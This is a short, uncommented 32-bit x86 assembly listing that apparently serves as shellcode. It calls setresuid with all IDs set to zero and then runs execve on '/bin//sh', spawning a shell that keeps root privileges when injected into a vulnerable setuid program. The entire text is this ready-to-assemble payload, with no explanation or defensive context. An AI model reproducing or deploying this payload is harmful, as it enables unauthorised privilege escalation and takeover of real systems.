BITS 32
xor eax, eax ;
xor ebx, ebx ;
xor ecx, ecx ;
xor edx, edx ;
mov al, 0xa4;
int 0x80;
xor eax, eax ;
mov al, 11 ;
push ecx ;
push 0x68732f2f ;
push 0x6e69622f ;
mov ebx, esp ; 
push ecx ; 
mov edx, esp ;
push ebx ;
mov ecx, esp ;
int 0x80 ;